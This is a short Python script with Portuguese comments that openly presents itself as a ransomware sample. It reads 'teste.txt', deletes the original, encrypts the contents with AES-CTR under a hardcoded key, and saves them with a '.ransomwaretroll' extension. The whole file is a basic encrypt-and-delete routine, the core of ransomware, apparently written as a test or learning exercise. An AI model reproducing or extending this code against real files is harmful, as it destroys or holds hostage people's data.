import os
import pyaes

def encrypt_file(filename, key):
    # Abrir o arquivo a ser criptografado
    with open(filename, "rb") as file:
        file_data = file.read()
    
    # Remover o arquivo original
    os.remove(filename)

    # Criptografar o arquivo
    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    # Salvar o arquivo criptografado
    encrypted_filename = filename + ".ransomwaretroll"
    with open(encrypted_filename, 'wb') as new_file:
        new_file.write(crypto_data)

# Nome do arquivo a ser criptografado
file_name = "teste.txt"

# Chave de criptografia (deve ter 16, 24 ou 32 bytes)
key = b"testeransomwares"

# Criptografar o arquivo
encrypt_file(file_name, key)
